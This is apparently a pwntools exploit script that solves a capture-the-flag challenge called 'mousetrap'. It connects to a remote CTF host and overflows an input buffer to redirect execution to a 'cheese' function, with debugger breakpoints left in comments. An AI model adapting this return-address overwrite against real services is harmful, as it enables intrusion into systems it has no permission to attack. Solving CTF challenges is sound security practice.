#main = 0000000000400842
#cheese = 0x00400717
#pop_rbp = 0x0000000000400698
from pwn import *

context.terminal = ['urxvt','-e','sh','-c']
context.log_level = 'DEBUG'
#for local
"""
sh = gdb.debug("./mousetrap",
        '''
        break *0x0040089a
        break *0x004007db
        break *0x004007e2
        ''')
"""
#for remote
nop = p64(0x90)
sh = remote("cha.hackpack.club", 41719)
main = p64(0x0000000000400842)
cheese = p64(0x40071b)
pop_rbp = p64(0x0000000000400698)
sh.sendlineafter("Name: ",b'a'*25)
sh.sendlineafter(": ",b'b'*24+cheese)
#padding = cyclic(16).encode()
#sh.sendlineafter(": ",padding+b'\x90'*8+cheese+main)
sh.interactive()
